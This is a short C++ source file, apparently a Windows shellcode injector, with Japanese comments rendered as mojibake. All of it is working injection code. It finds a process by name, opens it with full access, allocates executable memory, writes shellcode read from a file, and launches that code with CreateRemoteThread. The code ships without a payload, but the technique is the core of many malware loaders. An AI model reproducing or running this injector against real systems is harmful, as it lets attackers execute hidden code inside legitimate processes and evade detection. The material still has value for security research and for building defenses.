// main.cpp

#include"injector.h"

int wmain(int argc, wchar_t* argv[]) {

	// �����̐����`�F�b�N
	if (argc != 3) {
		std::wcout << "Usage: " << argv[0] << " [�v���Z�X��] [DLL�p�X]" << std::endl;
		return 1;
	}

	std::wstring processName = argv[1];
	std::wstring shellcodePath = argv[2];

	// �v���Z�X������v���Z�XID���擾
	 DWORD processId = GetProcessIdByProcessName(processName);

	// �t�@�C���̃o�C�i���f�[�^��ǂݎ��
	std::vector<BYTE> shellcode = ReadFileBytes(shellcodePath);

	// �v���Z�X�n���h�����擾
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// �V�F���R�[�h���������ރ��������m��
	LPVOID shellcodeMemory = VirtualAllocEx(processHandle, nullptr, shellcode.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// �V�F���R�[�h����������
	WriteProcessMemory(processHandle, shellcodeMemory, shellcode.data(), shellcode.size(), nullptr);

	// �����[�g�X���b�h���쐬���ăV�F���R�[�h�����s
	CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(shellcodeMemory), nullptr, 0, nullptr);

	return 0;
}